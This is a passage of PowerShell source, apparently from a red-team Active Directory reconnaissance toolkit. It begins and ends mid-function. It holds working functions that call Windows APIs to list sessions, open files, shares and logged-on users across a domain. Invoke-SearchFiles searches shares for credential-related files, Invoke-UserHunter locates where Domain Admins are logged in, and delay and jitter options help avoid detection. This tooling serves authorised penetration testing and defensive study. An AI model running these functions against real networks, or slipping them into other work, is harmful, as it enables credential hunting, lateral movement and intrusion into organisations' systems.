    # build the SESSION_INFO_10 structure manually using reflection
    #   adapted heavily from @mattifestation's post at http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('SESSION_INFO_10', $Attributes, [System.ValueType], 8+$PtrSize*2)

    $BufferField1 = $TypeBuilder.DefineField('sesi10_cname', [String], 'Public, HasFieldMarshal')
    $BufferField1.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField1.SetOffset(0)

    $BufferField2 = $TypeBuilder.DefineField('sesi10_username', [String], 'Public, HasFieldMarshal')
    $BufferField2.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField2.SetOffset($PtrSize*1)

    $TypeBuilder.DefineField('sesi10_time', [UInt32], 'Public').SetOffset($PtrSize*2) | Out-Null
    $TypeBuilder.DefineField('sesi10_idle_time', [UInt32], 'Public').SetOffset($PtrSize*2+4) | Out-Null

    $SESSION_INFO_10 = $TypeBuilder.CreateType()

    # arguments for NetSessionEnum
    $QueryLevel = 10
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # 'manually' convert these strings to unicode by inserting 0x00's between characters
    # because the reflection implicitly converts the string to ascii
    $NewHostName = ""
    foreach ($c in $HostName.ToCharArray()) { $NewHostName += "$c$([char]0x0000)" }
    $NewUserName = ""
    foreach ($c in $UserName.ToCharArray()) { $NewUserName += "$c$([char]0x0000)" }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $NetSessionEnumAddr = Get-ProcAddress netapi32.dll NetSessionEnum
    $NetSessionEnumDelegate = Get-DelegateType @( [string], [string], [string], [Int32], [Int].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()) ([Int])
    $NetSessionEnum = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetSessionEnumAddr, $NetSessionEnumDelegate)
    $Result = $NetSessionEnum.Invoke($NewHostName, "", $NewUserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # have to recast this
    $ptrInfo = [System.Intptr] $ptrInfo

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()

    Write-Debug "Get-NetSessions result: $Result"

    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($SESSION_INFO_10)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$SESSION_INFO_10)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer using NetApiBufferFree
        $NetApiBufferFreeAddr = Get-ProcAddress netapi32.dll NetApiBufferFree
        $NetApiBufferFreeDelegate = Get-DelegateType @( [IntPtr]) ([Int])
        $NetApiBufferFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetApiBufferFreeAddr, $NetApiBufferFreeDelegate)
        $t = $NetApiBufferFree.Invoke($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Debug "The user does not have access to the requested information."}
          (124)         {Write-Debug "The value specified for the level parameter is not valid."}
          (87)          {Write-Debug 'The specified parameter is not valid.'}
          (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Debug 'Insufficient memory is available.'}
          (2312)        {Write-Debug 'A session does not exist with the computer name.'}
          (2351)        {Write-Debug 'The computer name is not valid.'}
          (2221)        {Write-Debug 'Username not found.'}
          (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetFiles {
    <#
    .SYNOPSIS
    Get files opened on a remote server.

    .DESCRIPTION
    This function will execute the NetFileEnum Win32API call to query
    a given host for information about open files. 

    Note: only members of the Administrators or Account Operators local group 
    can successfully execute NetFileEnum

    .PARAMETER HostName
    The hostname to query for open files.

    .PARAMETER TargetUser
    Return files open only from this particular user.

    .PARAMETER TargetHost
    Return files open only from this particular host.

    .OUTPUTS
    FILE_INFO_3 structure. A representation of the FILE_INFO_3
    result structure which includes the host and username associated
    with active sessions.

    .EXAMPLE
    > Get-NetFiles -HostName fileserver
    Returns open files/owners on fileserver.

    .EXAMPLE
    > Get-NetFiles -HostName fileserver -TargetUser john
    Returns files opened on fileserver by 'john'
   
    .EXAMPLE
    > Get-NetFiles -HostName fileserver -TargetHost 192.168.1.100
    Returns files opened on fileserver from host 192.168.1.100
    #>
    
    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$TargetUser = "",
        [string]$TargetHost = ""
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # if a target host is specified, format/replace variables
    if ($TargetHost -ne ""){
        $TargetUser = "\\$TargetHost"
    }
    
    # load up the assemblies we need - http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('TestAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)

    # used for C structures below
    $MarshalAsConstructor = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor([Runtime.InteropServices.UnmanagedType])
    $MarshalAsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($MarshalAsConstructor, @([Runtime.InteropServices.UnmanagedType]::LPWStr))

    # 4 for 32 bit, 8 for 64 bit
    $PtrSize = [IntPtr]::size

    # build the FILE_INFO_3 structure manually using reflection
    #   adapted heavily from @mattifestation's post at http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('FILE_INFO_3', $Attributes, [System.ValueType], 12+$PtrSize*2)

    $TypeBuilder.DefineField('fi3_id', [UInt32], 'Public').SetOffset(0) | Out-Null
    $TypeBuilder.DefineField('fi3_permissions', [UInt32], 'Public').SetOffset(4) | Out-Null
    $TypeBuilder.DefineField('fi3_num_locks', [UInt32], 'Public').SetOffset(8) | Out-Null

    $BufferField1 = $TypeBuilder.DefineField('fi3_pathname', [String], 'Public, HasFieldMarshal')
    $BufferField1.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField1.SetOffset(16)

    $BufferField2 = $TypeBuilder.DefineField('fi3_username', [String], 'Public, HasFieldMarshal')
    $BufferField2.SetCustomAttribute($MarshalAsCustomAttribute)
    $BufferField2.SetOffset(16+$PtrSize)

    $FILE_INFO_3 = $TypeBuilder.CreateType()

    # arguments for NetFileEnum
    $QueryLevel = 3
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # 'manually' convert these strings to unicode by inserting 0x00's between characters
    # because the reflection implicitly converts the string to ascii
    $NewHostName = ""
    foreach ($c in $HostName.ToCharArray()) { $NewHostName += "$c$([char]0x0000)" }
    $NewTargetUserName = ""
    foreach ($c in $TargetUser.ToCharArray()) { $NewTargetUserName += "$c$([char]0x0000)" }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $NetFileEnumAddr = Get-ProcAddress netapi32.dll NetFileEnum
    $NetFileEnumDelegate = Get-DelegateType @( [string], [string], [string], [Int32], [Int].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType()) ([Int])
    $NetFileEnum = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetFileEnumAddr, $NetFileEnumDelegate)
    $Result = $NetFileEnum.Invoke($NewHostName, "", $NewTargetUserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # have to recast this
    $ptrInfo = [System.Intptr] $ptrInfo

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()

    Write-Debug "Get-NetFiles result: $Result"

    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($FILE_INFO_3)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$FILE_INFO_3)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer using NetApiBufferFree
        $NetApiBufferFreeAddr = Get-ProcAddress netapi32.dll NetApiBufferFree
        $NetApiBufferFreeDelegate = Get-DelegateType @( [IntPtr]) ([Int])
        $NetApiBufferFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NetApiBufferFreeAddr, $NetApiBufferFreeDelegate)
        $t = $NetApiBufferFree.Invoke($ptrInfo)
    }
    else 
    {
        switch ($Result) {
          (5)           {Write-Debug  "The user does not have access to the requested information."}
          (124)         {Write-Debug "The value specified for the level parameter is not valid."}
          (87)          {Write-Debug 'The specified parameter is not valid.'}
          (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
          (8)           {Write-Debug 'Insufficient memory is available.'}
          (2312)        {Write-Debug 'A session does not exist with the computer name.'}
          (2351)        {Write-Debug 'The computer name is not valid.'}
          (2221)        {Write-Debug 'Username not found.'}
          (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetFileSessions {
    <#
    .SYNOPSIS
    Matches up Get-NetSessions with Get-NetFiles to see who
    has opened files on the server and from where.

    .DESCRIPTION
    Matches up Get-NetSessions with Get-NetFiles to see who
    has opened files on the server and from where.

    .PARAMETER HostName
    The hostname to query for open sessions/files. 
    Defaults to localhost.

    .PARAMETER OutFile
    Output results to a specified csv output file.

    .OUTPUTS
    ....

    .EXAMPLE
    > Get-NetFileSessions
    Returns open file/session information for the localhost

    .EXAMPLE
    > Get-NetFileSessions -HostName WINDOWS1
    Returns open file/session information for the WINDOWS1 host

    .LINK
    http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>


    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost",
        [string]$OutFile
    )

    # holder for our session data
    $sessions=@{};

    # grab all the current sessions for the host
    Get-Netsessions -HostName $HostName | foreach { $sessions[$_.sesi10_username] = $_.sesi10_cname };

    # mesh the NetFiles data with the NetSessions data
    $data = Get-NetFiles | Select-Object @{Name=’Username’;Expression={$_.fi3_username}},@{Name=’Filepath’;Expression={$_.fi3_pathname}},@{Name=’Computer’;Expression={$sess[$_.fi3_username]}}

    # output to a CSV file if specified
    if ($OutFile) {
        $data | export-csv -notypeinformation -path $OutFile
    }
    else{
        # otherwise just dump everything to stdout
        $data
    }   
}


function Get-LastLoggedOn {
    <#
    .SYNOPSIS
    Gets the last user logged onto a target machine.

    .DESCRIPTION
    This function uses remote registry functionality to return
    the last user logged onto a target machine.

    Note: This function requires administrative rights on the
    machine you're enumerating.

    .PARAMETER HostName
    The hostname to query for open files. Defaults to the 
    local host name.

    .OUTPUTS
    The last loggedon user name, or $null if the enumeration fails.

    .EXAMPLE
    > Get-LastLoggedOn
    Returns the last user logged onto the local machine.

    .EXAMPLE
    > Get-LastLoggedOn -HostName WINDOWS1
    Returns the last user logged onto WINDOWS1
    #>

    [CmdletBinding()]
    param(
        $HostName
    )

    # default to the local hostname
    if (-not $HostName){
        $HostName = [System.Net.Dns]::GetHostName()
    }

    # try to open up the remote registry key to grab the last logged on user
    try{
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $HostName)
        $regKey= $reg.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI",$false)
        $regKey.GetValue("LastLoggedOnUser")
    }
    catch{
        Write-Verbose "[!] Error opening remote registry on $HostName. Remote registry likely not enabled."
        $null
    }
}


function Get-UserProperties {
    <#
    .SYNOPSIS
    Returns a list of all user object properties. If a property
    name is specified, it returns all [user:property] values.

    Taken directly from @obscuresec's post referenced in the link.
    
    .DESCRIPTION
    This function a list of all user object properties, optinoally
    returning all the user:property combinations if a property 
    name is specified.

    .PARAMETER Domain
    The domain to query for user properties.

    .PARAMETER Properties
    Return property names for users. 

    .OUTPUTS
    System.Object[] array of all extracted user properties.

    .EXAMPLE
    > Get-UserProperties
    Returns all user properties for users in the current domain.

    .EXAMPLE
    > Get-UserProperties -Properties ssn,lastlogon,location
    Returns all an array of user/ssn/lastlogin/location combinations
    for users in the current domain.

    .EXAMPLE
    > Get-UserProperties -Domain testing
    Returns all user properties for users in the 'testing' domain.

    .LINK
    http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>

    [CmdletBinding()]
    param(
        $Domain,
        $Properties
    )

    # if properties are specified, return all values of it for all users
    if ($Properties){
        if ($Domain){
            $users = Get-NetUsers -Domain $Domain
        }
        else{
            $users = Get-NetUsers
        }
        $users | foreach {

            $props = @{}
            $s = $_.Item("SamAccountName")
            $props.Add('SamAccountName', "$s")

            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                $p = $_.Item($Property)
                $props.Add($Property, "$p")
            }
            [pscustomobject] $props
        }

    }
    else{
        # otherwise return all the property names themselves

        if ($Domain){
            $dn = "DC=$($Domain.Replace('.', ',DC='))"
            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            # samAccountType=805306368 indicates user objects 
            $userSearcher.filter = "(&(samAccountType=805306368))"
            (($userSearcher.FindAll())[0].properties).PropertyNames
        }
        else{
            ((([adsisearcher]"objectCategory=User").Findall())[0].properties).PropertyNames
        }
    }
}


function Invoke-SearchFiles {
    <#
    .SYNOPSIS
    Searches a given server/path for files with specific terms in the name.
    
    .DESCRIPTION
    This function recursively searches a given UNC path for files with 
    specific keywords in the name (default of pass, sensitive, secret, admin,
    login and unattend*.xml). The output can be piped out to a csv with the 
    -OutFile flag. By default, hidden files/folders are included in search results.

    .PARAMETER Path
    UNC/local path to recursively search.

    .PARAMETER Terms
    Terms to search for.

    .PARAMETER OfficeDocs
    Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXES
    Find .EXEs accessed within the last week.

    .PARAMETER AccessDateLimit
    Only return files with a LastAccessTime greater than this date value.

    .PARAMETER WriteDateLimit
    Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreateDateLimit
    Only return files with a CreationDate greater than this date value.

    .PARAMETER ExcludeFolders
    Exclude folders from the search results.

    .PARAMETER ExcludeHidden
    Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess
    Only returns files the current user has write access to.

    .PARAMETER OutFile
    Output results to a specified csv output file.

    .OUTPUTS
    The full path, owner, lastaccess time, lastwrite time, and size for
    each found file.

    .EXAMPLE
    > Invoke-SearchFiles -Path \\WINDOWS7\Users\
    Returns any files on the remote path \\WINDOWS7\Users\ that have 'pass',
    'sensitive', or 'secret' in the title.

    .EXAMPLE
    > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
    Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
    or 'email' in the title, and writes the results out to a csv file
    named 'out.csv'

    .EXAMPLE
    > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -AccessDateLimit 6/1/2014
    Returns all files accessed since 6/1/2014.

    .LINK
    http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [string]$Path = ".\",
        $Terms,
        [Switch] $OfficeDocs,
        [Switch] $FreshEXES,
        $AccessDateLimit = "1/1/1970",
        $WriteDateLimit = "1/1/1970",
        $CreateDateLimit = "1/1/1970",
        [Switch] $ExcludeFolders,
        [Switch] $ExcludeHidden,
        [Switch] $CheckWriteAccess,
        [string] $OutFile
    )

    # default search terms
    $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential')

    # check if custom search terms were passed
    if ($Terms){
        if($Terms -isnot [system.array]){
            $Terms = @($Terms)
        }
        $SearchTerms = $Terms
    }

    # append wildcards to the front and back of all search terms
    for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
        $SearchTerms[$i] = "*$($SearchTerms[$i])*"
    }

    # search just for office documents if specified
    if ($OfficeDocs){
        $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
    }

    # find .exe's accessed within the last 7 days
    if($FreshEXES){
        # get an access time limit of 7 days ago
        $AccessDateLimit = (get-date).AddDays(-7).ToString("MM/dd/yyyy")
        $SearchTerms = "*.exe"
    }

    # build our giant recursive search command w/ conditional options
    $cmd = "get-childitem $Path -rec $(if(-not $ExcludeHidden){`"-Force`"}) -ErrorAction SilentlyContinue -include $($SearchTerms -join `",`") | where{ $(if($ExcludeFolders){`"(-not `$_.PSIsContainer) -and`"}) (`$_.LastAccessTime -gt `"$AccessDateLimit`") -and (`$_.LastWriteTime -gt `"$WriteDateLimit`") -and (`$_.CreationTime -gt `"$CreateDateLimit`")} | select-object FullName,@{Name='Owner';Expression={(Get-Acl `$_.FullName).Owner}},LastAccessTime,LastWriteTime,Length $(if($CheckWriteAccess){`"| where { `$_.FullName } | where { Invoke-CheckWrite -Path `$_.FullName }`"}) $(if($OutFile){`"| export-csv -Append -notypeinformation -path $OutFile`"})"

    # execute the command
    IEX $cmd
}


function Invoke-CheckLocalAdminAccess {
    <#
    .SYNOPSIS
    Checks if the current user context has local administrator access
    to a specified host or IP.

    Idea stolen from the local_admin_search_enum post module in 
    Metasploit written by:
        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
    
    .DESCRIPTION
    This function will use the OpenSCManagerA Win32API call to to establish
    a handle to the remote host. If this succeeds, the current user context
    has local administrator acess to the target.

    .PARAMETER HostName
    The hostname to query for active sessions.

    .OUTPUTS
    $true if the current user has local admin access to the hostname,
    $false otherwise

    .EXAMPLE
    > Invoke-CheckLocalAdminAccess -HostName sqlserver
    Returns active sessions on the local host.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [string]$HostName
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html    
    $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
    $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])
    $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
    
    # 0xF003F - SC_MANAGER_ALL_ACCESS
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
    $handle = $OpenSCManagerA.Invoke("\\$HostName", "ServicesActive", 0xF003F)

    Write-Debug "Invoke-CheckLocalAdminAccess handle: $handle"

    # if we get a non-zero handle back, everything was successful
    if ($handle -ne 0){
        # Close off the service handle
        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    
        $t = $CloseServiceHandle.Invoke($handle)

        $true
    }
    # otherwise it failed
    else{

        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Int])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
        $err = $GetLastError.Invoke()

        # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
        Write-Debug "Invoke-CheckLocalAdminAccess LastError: $err"
        $false
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-Netview {
    <#
    .SYNOPSIS
    Gets information for each found host on the local domain.
    Original functionality was implemented in the netview.exe tool
    released by Rob Fuller (@mubix). See links for more information.

    Powershell module author: @harmj0y
    
    .DESCRIPTION
    This is a port of Mubix's netview.exe tool. It finds the local domain name
    for a host using Get-NetDomain, reads in a host list or queries the domain 
    for all active machines with Get-NetComputers, randomly shuffles the host list, 
    then for each target server it runs  Get-NetSessions, Get-NetLoggedon, 
    and Get-NetShare to enumerate each target host.

    .PARAMETER ExcludeShares
    Exclude common shares from display (C$, IPC$, etc.)

    .PARAMETER CheckShareAccess
    Only display found shares that the local user has access to.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Shuffle
    Shuffle the host list before before enumerating.

    .PARAMETER HostList
    List of hostnames/IPs enumerate.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain
    Domain to enumerate for hsots.

    .EXAMPLE
    > Invoke-Netview
    Run all Netview functionality and display the output.

    .EXAMPLE
    > Invoke-Netview -Delay 60
    Run all Netview functionality with a 60 second (+/- *.3) randomized
    delay between touching each host.

    .EXAMPLE
    > Invoke-Netview -Delay 10 -HostList hosts.txt
    Runs Netview on a pre-populated host list with a 10 second (+/- *.3) 
    randomized delay between touching each host.

    .EXAMPLE
    > Invoke-Netview -Ping
    Runs Netview and pings hosts before eunmerating them.

    .EXAMPLE
    > Invoke-Netview -Domain testing
    Runs Netview for hosts in the 'testing' domain.

    .LINK
    https://github.com/mubix/netview
    www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)] [Switch] $ExcludeShares,
        [Parameter(Mandatory = $False)] [Switch] $CheckShareAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = "",
        [string]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # shares we want to ignore if the flag is set
    $excludedShares = @("", "ADMIN$", "IPC$", "C$", "PRINT$")

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    # random object for delay
    $randNo = New-Object System.Random

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`nRunning Netview with delay of $Delay`r`n"
    $statusOutput += "[+] Domain: $targetDomain"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $statusOutput += "[!] Input file '$HostList' doesn't exist!"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }

    # randomize the server list if specified
    if ($Shuffle) {
        $servers = Get-ShuffledArray $servers
    }

    $DomainControllers = Get-NetDomainControllers -Domain $targetDomain

    $HostCount = $servers.Count
    $statusOutput += "[+] Total number of hosts: $HostCount`n"

    if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
        foreach ($DC in $DomainControllers){
            $statusOutput += "[+] Domain Controller: $DC"
        }
    }

    # return/output the initial status output
    $statusOutput
    $counter = 0

    foreach ($server in $servers){

        $counter = $counter + 1

        # start a new status output array for each server
        $serverOutput = @()

        # make sure we have a server
        if (($server -ne $null) -and ($server.trim() -ne "")){

            $ip = Get-HostIP -hostname $server

            # make sure the IP resolves
            if ($ip -ne ""){
                # sleep for our semi-randomized interval
                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                
                Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
                $serverOutput += "`r`n[+] Server: $server"
                $serverOutput += "[+] IP: $ip"

                # optionally check if the server is up first
                $up = $true
                if($ping){
                    $up = Test-Server -Server $server
                }
                if ($up){

                    # get active sessions for this host and display what we find
                    $sessions = Get-NetSessions -HostName $server
                    foreach ($session in $sessions) {
                        $username = $session.sesi10_username
                        $cname = $session.sesi10_cname
                        $activetime = $session.sesi10_time
                        $idletime = $session.sesi10_idle_time
                        # make sure we have a result
                        if (($username -ne $null) -and ($username.trim() -ne "")){
                            $serverOutput += "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                        }
                    }

                    # get any logged on users for this host and display what we find
                    $users = Get-NetLoggedon -HostName $server
                    foreach ($user in $users) {
                        $username = $user.wkui1_username
                        $domain = $user.wkui1_logon_domain

                        if ($username -ne $null){
                            # filter out $ machine accounts
                            if ( !$username.EndsWith("$") ) {
                                $serverOutput += "[+] $server - Logged-on - $domain\\$username"
                            }
                        }
                    }

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        if ($share -ne $null){
                            $netname = $share.shi1_netname
                            $remark = $share.shi1_remark
                            $path = "\\"+$server+"\"+$netname

                            # check if we're filtering out common shares
                            if ($ExcludeShares.IsPresent){
                                if (($netname) -and ($netname.trim() -ne "") -and ($excludedShares -notcontains $netname)){
                                    
                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}

                                    }
                                    else{
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }

                                }  
                            }
                            # otherwise, display all the shares
                            else {
                                if (($netname) -and ($netname.trim() -ne "")){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        $serverOutput += "[+] $server - Share: $netname `t: $remark"
                                    }
                                }
                            }

                        }
                    }

                }
            }
        }
        # return/output this server's output
        $serverOutput
    }
}


function Invoke-UserHunter {
    <#
    .SYNOPSIS
    Finds which machines users of a specified group are logged into.
    Author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for users of a specified group (default "domain admins")
    with Get-NetGroup or reads in a target user list, queries the domain for all 
    active machines with Get-NetComputers or reads in a pre-populated host list,
    randomly shuffles the target list, then for each server it gets a list of 
    active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared 
    against the target list, and a status message is displayed for any hits. 
    The flag -CheckAccess will check each positive host to see if the current 
    user has local admin access to the machine.

    .PARAMETER GroupName
    Group name to query for target users.

    .PARAMETER UserName
    Specific username to search for.

    .PARAMETER UserList
    List of usernames to search for.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Shuffle
    Shuffle the host list before before enumerating.

    .PARAMETER CheckAccess
    Check if the current user has local admin access to found machines.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain
    Domain for query for machine.

    .EXAMPLE
    > Invoke-UserHunter
    Finds machines on the local domain where domain admins are logged into.

    .EXAMPLE
    > Invoke-UserHunter -Domain 'testing'
    Finds machines on the 'testing' domain where domain admins are logged into.

    .EXAMPLE
    > Invoke-UserHunter -CheckAccess
    Finds machines on the local domain where domain admins are logged into
    and checks if the current user has local administrator access.

    .EXAMPLE
    > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
    Finds machines in hosts.txt where any members of users.txt are logged in
    or have sessions.

    .EXAMPLE
    > Invoke-UserHunter -GroupName "Power Users" -Delay 60
    Find machines on the domain where members of the "Power Users" groups are 
    logged into with a 60 second (+/- *.3) randomized delay between 
    touching each host.

    .EXAMPLE
    > Invoke-UserHunter -UserName jsmith -CheckAccess
    Find machines on the domain where jsmith is logged into and checks if 
    the current user has local administrator access.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
        [string]$UserName = "",
        [Parameter(Mandatory = $False)] [Switch] $CheckAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = "",
        [string]$UserList = "",
        [string]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # users we're going to be searching for
    $TargetUsers = @()

    # random object for delay
    $randNo = New-Object System.Random

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
